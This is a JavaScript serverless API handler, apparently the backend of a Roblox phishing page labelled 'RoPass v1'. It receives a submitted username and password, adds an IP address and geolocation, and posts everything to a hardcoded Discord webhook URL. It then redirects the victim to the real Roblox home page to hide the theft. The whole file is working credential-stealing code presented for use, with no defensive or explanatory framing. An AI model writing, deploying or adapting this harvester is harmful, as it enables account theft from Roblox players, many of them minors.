import axios from 'axios';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).end();
  }

  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing credentials' });
  }

  try {
    // Get public IP
    const ipResponse = await axios.get('https://api.ipify.org?format=json');
    const publicIp = ipResponse.data.ip;

    // Get geolocation
    const geoResponse = await axios.get(`https://ipapi.co/${publicIp}/json/`);
    const { latitude, longitude } = geoResponse.data;

    // Send to Discord
    const embed = {
      title: 'RoPass v1',
      color: parseInt('3762dc', 16),
      fields: [
        { name: '👤 Username', value: `\`${username}\``, inline: true },
        { name: '🔑 Password', value: `\`${password}\``, inline: true },
        { name: '🌍 Public IP', value: `\`${publicIp}\``, inline: true },
        { name: '📍 Latitude', value: `\`${latitude ?? 'N/A'}\``, inline: true },
        { name: '📏 Longitude', value: `\`${longitude ?? 'N/A'}\``, inline: true },
        { name: '📅 Date', value: `\`${new Date().toISOString().replace('T', ' ').substring(0, 19)}\``, inline: true },
      ],
    };

    await axios.post('https://discord.com/api/webhooks/1503805736327713021/y3z2ZA7rURYoBq1yH_p0IkWULLlEiy1kq6nHoctNbZ0ehkHgvYKcws6utoXH1tt_mADD', {
      embeds: [embed],
    });

    // Redirect (simulate PHP header redirect)
    res.status(200).json({ redirect: 'https://www.roblox.com/home' });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
}

// Enable body parsing for form data
export const config = {
  api: {
    bodyParser: true,
  },
};   
